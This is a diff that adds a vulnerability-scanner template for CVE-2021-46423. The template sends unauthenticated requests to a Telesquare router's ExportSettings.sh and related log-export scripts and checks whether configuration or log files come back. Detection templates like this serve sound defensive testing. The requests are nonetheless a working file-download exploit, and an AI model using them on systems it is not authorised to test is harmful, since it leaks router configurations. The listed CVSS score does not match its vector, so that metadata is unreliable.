@@ -1,0 +1,46 @@
+id: cve-2021-46423
+info:
+  name: Telesquare TLR-2005Ksh ExportSettings.sh File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Telesquare TLR-2005Ksh and similar routers contain a vulnerability that allows unauthenticated attackers to download configuration files.
+  reference:
+    - https://drive.google.com/drive/folders/1iY4QqzZLdYgwD0LYc74M4Gm2wSC6Be1u?usp=sharing
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2021-46423
+http:
+  - raw:
+      - |
+        GET /cgi-bin/ExportSettings.sh HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "settings.dat"
+      - type: word
+        part: body
+        words:
+          - "export file"
+  - raw:
+      - |
+        GET /cgi-bin/{{filePath}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      filePath:
+        - ExportSettings.sh
+        - ExportvpnLog.sh
+        - ExportTrafficLog.sh
+    attack: clusterbomb
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
